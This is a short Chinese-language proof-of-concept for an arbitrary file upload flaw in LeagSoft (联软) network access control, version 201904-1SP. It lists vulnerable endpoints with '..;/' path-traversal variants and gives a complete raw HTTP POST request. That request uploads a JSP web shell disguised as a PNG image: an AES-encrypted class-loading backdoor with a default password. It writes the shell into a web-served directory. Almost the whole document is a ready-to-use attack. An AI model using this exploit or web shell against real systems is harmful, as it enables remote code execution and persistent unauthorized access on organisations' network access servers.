# 联软准入任意文件上传

> 2020.9

## #影响范围

201904-1SP

## #Poc

![img](https://www.hedysx.com/wp-content/uploads/2020/09/2020091409164497.png)

```
http://x.x.x.x/uai/newDevRegist/updateDevUploadinfo.htm
http://x.x.x.x/uai/newDevRegist/newDevRegist/newDevRegist/..;/..;/updateDevUploadinfo.htm
http://x.x.x.x/uai/download/download/download/..;/..;/uploadfileToPath.htm
http://x.x.x.x/uai/download/uploadfileToPath.htm
```

```http
POST /uai/download/uploadfileToPath.htm HTTP/1.1
HOST: x.x.x.x

-----------------------------570xxxxxxxxx6025274xxxxxxxx1
Content-Disposition: form-data; name="input_localfile"; filename="c.jsp"
Content-Type: image/png
 
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
 
-----------------------------570xxxxxxxxx6025274xxxxxxxx1
Content-Disposition: form-data; name="uploadpath"
 
../webapps/notifymsg/devreport/
-----------------------------570xxxxxxxxx6025274xxxxxxxx1--
```